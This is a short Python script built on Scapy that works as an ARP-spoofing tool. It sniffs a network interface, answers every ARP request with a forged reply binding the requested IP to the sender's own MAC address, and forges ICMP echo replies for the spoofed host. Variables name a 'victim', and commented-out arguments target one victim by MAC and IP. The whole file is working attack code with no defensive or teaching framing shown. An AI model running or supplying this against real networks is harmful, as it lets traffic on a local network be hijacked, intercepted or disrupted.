import sys, os, time, argparse

from scapy.all import sniff, sendp, get_if_list, get_if_hwaddr, get_if_addr
from scapy.all import Ether, ARP, IP, ICMP

INTERFACE = 'eth0'

def handle_packet(packet):
    if ARP in packet and packet[ARP].op == 1:
        send_spoofed_arp_response(packet[ARP].hwsrc, packet[ARP].psrc, packet[ARP].pdst)
    elif ICMP in packet:
        #packet.display()
        send_ICMP_echo_response(packet)

def send_spoofed_arp_response(victim_mac, victim_ip, spoofed_addr):
    src_mac = get_if_hwaddr(INTERFACE)
    packet = Ether(src=src_mac, dst=victim_mac) / ARP(op=2, hwsrc=src_mac, psrc=spoofed_addr, hwdst=victim_mac, pdst=victim_ip)
    sendp(packet, iface=INTERFACE)

def send_ICMP_echo_response(packet):
    if packet[ICMP].type != 8:
        return None
    print("Handled")
    ether = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
    ip = IP(src=packet[IP].dst, dst=packet[IP].src)
    icmp = ICMP(type='echo-reply', code=0, id=packet[ICMP].id, seq=packet[ICMP].seq)
    packet = ether / ip / icmp
    sendp(packet, iface=INTERFACE)

if __name__ == '__main__':
    sniff(iface=INTERFACE, prn=lambda p: handle_packet(p))
    #parser = argparse.ArgumentParser()
    #parser.add_argument('-victim_mac', type=str, help="MAC address of victim")
    #parser.add_argument('-victim_ip', type=str, help="IP address of victim")
    #parser.add_argument('-spoofed_addr', type=str, help="IP address seeked by victim")
    #args = parser.parse_args()

    #send_spoofed_arp_response(args.victim_mac, args.victim_ip, args.spoofed_addr)